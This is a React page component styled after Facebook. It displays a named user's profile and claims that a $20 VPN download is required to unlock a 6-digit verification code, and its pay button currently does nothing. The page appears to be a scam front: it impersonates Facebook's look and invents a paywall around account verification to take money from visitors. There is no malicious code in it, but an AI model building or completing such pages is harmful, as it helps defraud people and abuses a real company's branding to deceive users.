'use client';

import { useState } from 'react';

export default function VpnRequest() {
  const [paid, setPaid] = useState(false); // This line can also be removed if the button does truly nothing

  const fbUser = {
    name: 'Nur Alam',
    profilePic:
      'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRGCg4pLQ1ckWPPMqf4s4eLyiKKMUU9bpjtA&s',
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
      <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
        {/* User Header */}
        <div className="flex items-center gap-4 mb-6">
          <img
            src={fbUser.profilePic}
            alt="Profile"
            className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
          />
          <div>
            <p className="text-sm text-gray-500">Facebook User</p>
            <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
          </div>
        </div>

        {/* Title & Instructions */}
        <h1 className="text-xl font-semibold text-[#111827] mb-2">
          VPN Required Before Code Access
        </h1>
        <p className="text-sm text-gray-600 mb-5">
          You must download and connect to the secure VPN server to unlock your 6-digit verification code.
        </p>

        {/* Payment Notice */}
        <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
          <p className="text-sm font-medium">
            A $20 payment is required to download the VPN configuration.
          </p>
        </div>

        {/* Action Button - Does Nothing */}
        <button
          onClick={() => { }}
          className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
        >
          Pay $20 to Download VPN
        </button>
      </div>
    </div>
  );
}
